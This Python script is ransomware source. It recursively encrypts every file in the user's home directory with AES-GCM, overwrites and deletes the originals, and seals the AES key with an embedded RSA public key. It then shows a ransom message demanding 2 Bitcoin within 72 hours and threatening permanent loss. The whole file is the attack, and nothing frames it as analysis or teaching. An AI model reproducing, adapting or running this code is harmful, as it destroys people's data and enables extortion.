import os
import random
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.padding import PKCS7
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import tkinter as tk
from tkinter import messagebox

# Standard directory: /home/user/
MAIN_DIRECTORY = os.path.expanduser("~")
ENCRYPTED_KEY_PATH = os.path.join(os.path.expanduser("~"), "323cd1f4dd86c498c538b9621a384d49.enc")
RSA_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAlZ7cUucEzY2H7r4QCyIe
EL7Bg3D0mXIiUAk3OkdADCc/XACWP6XuzShXTrmBnydyZd61UI/FrDowAn6Pbc70
nnSjHYzaEnSMyYmD5WVH+EGhph0wNntpPaasifF94hr9W781pLC2XAzFAwU98F3B
EU7PQj8n572qGbfFDKJ1r0kIUWwtx7UEGo0kTD9/OIQsBldYurBGFJ3RA+PzzMaP
QHu1xDefySsiWmtUalmHp9oFnRMbbmhYi/mQL+xqe7RSJ1z74pSmqYhS6kPu6rkk
z9p0RmFVIBK9S3E2vguegGtc5/gachr1dQ4BgQFmp8kuf14KfPRGUtKsd1Trlfvl
3nJkWp7UVTACcghCgVZlH4et3t9QZEK86EoLAVdTzSDfNPkDUZ1jdKeI8GFNhKuk
lZN7C6QbMorUFeVsgQazIZA6/rEPk0dX22fitkiV681yGwHz1GG5vmRsgXp9ncT1
Zml3ci+b7Rs3qKGWYtkOXKUaiVE2lfsBl82KWXzlZy/ws45QATg4ByzWX4idXgUS
krWglZ/GPwmy0H7JFxnoG7hoZzFQp1NwdUvX+kzSCyELbTuWrvBYihpvZBbyUd+4
IG93i3BJR6x5OQD7FBaV3UmBeoUS6KWBwR+gJqu3WYNsAbRPQRbfoZvK/6u09PUy
kbx7w402E9+gD+9qNEVQ5QUCAwEAAQ==
-----END PUBLIC KEY-----"""

# Generate a random AES key with 256bits
def generate_aes_key():
    return os.urandom(32)

# Delete original files
def secure_delete(file_path: str):
    if not os.path.isfile(file_path):
        return
    # Overwrite file with random bytes
    with open(file_path, 'ba+', buffering=0) as f:
        length = f.tell()
        f.seek(0)
        f.write(os.urandom(length))
        f.flush()
        os.fsync(f.fileno())

    os.remove(file_path)

# Encrypts a file by processing it in chunks
def encrypt_with_aes(file_path: str, aes_key: bytes, chunk_size: int = 64 * 1024):
    try:
        # exception:
        excluded_files = ["EncryptFiles"]
        if (
            os.path.basename(file_path).lower() in [f.lower() for f in excluded_files]
            or file_path.endswith(".323cd1f4dd86c498c538b9621a384d49")
        ):
            return False

        # Inicialization vector
        iv = os.urandom(12)
        cipher = Cipher(algorithms.AES(aes_key), modes.GCM(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        # Save all file with this ending
        encrypted_file_path = file_path + '.323cd1f4dd86c498c538b9621a384d49'

        with open(file_path, 'rb') as infile, open(encrypted_file_path, 'wb') as outfile:
            outfile.write(iv)

            # The file is read and processed in small chunks, rather than loading it into memory as a whole.
            for chunk in iter(lambda: infile.read(chunk_size), b''):
                padded_chunk = PKCS7(128).padder().update(chunk)
                encrypted_chunk = encryptor.update(padded_chunk)
                outfile.write(encrypted_chunk)

            # Completes file encryption
            final_padded_chunk = PKCS7(128).padder().finalize()
            if final_padded_chunk:
                outfile.write(encryptor.update(final_padded_chunk))
            outfile.write(encryptor.finalize())
            outfile.write(encryptor.tag)

        # Delete original file
        secure_delete(file_path)
        return encrypted_file_path
    except PermissionError:
        print(f"Denied permition {file_path}.")
    except Exception as e:
        print(f"Encrypt error {file_path}: {e}")
    return False

# Processes a directory, encrypting all files and subdirectories.
def process_directory(directory: str, aes_key: bytes):
    try:
        for root, _, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                encrypt_with_aes(file_path, aes_key)
    except Exception as e:
        print(f"Directory error {directory}: {e}")

def encrypt_aes_key_with_rsa(aes_key: bytes):
    # Recovery public key (RSA)
    public_key = RSA.import_key(RSA_PUBLIC_KEY.encode('utf-8'))
    cipher_rsa = PKCS1_OAEP.new(public_key)
    encrypted_aes_key = cipher_rsa.encrypt(aes_key)
    # Save encrypted aes key
    with open(ENCRYPTED_KEY_PATH, 'wb') as file:
        file.write(encrypted_aes_key)

if __name__ == "__main__":
     aes_key = generate_aes_key()
     # Encrypt all files
     process_directory(MAIN_DIRECTORY, aes_key)
     # Criptografa a chave AES com RSA
     encrypt_aes_key_with_rsa(aes_key)

# Show a message
root = tk.Tk()
root.withdraw()
titulo = "Your Files Have Been Encrypted!"
mensagem = """
All your important files have been locked with a strong encryption algorithm. Your documents, photos, and databases are no longer accessible.

What Happened?
Your files are encrypted, and only we can provide the decryption key. Attempting to decrypt them without our key will result in permanent data loss.

Payment Details:

    Amount: 2 Bitcoin
    Bitcoin Wallet: 1XxYyZz...
    Payment Deadline: 72 hours
    (After this, the price doubles or your files may be permanently deleted.)
"""

messagebox.showwarning(titulo, mensagem)
root.destroy()

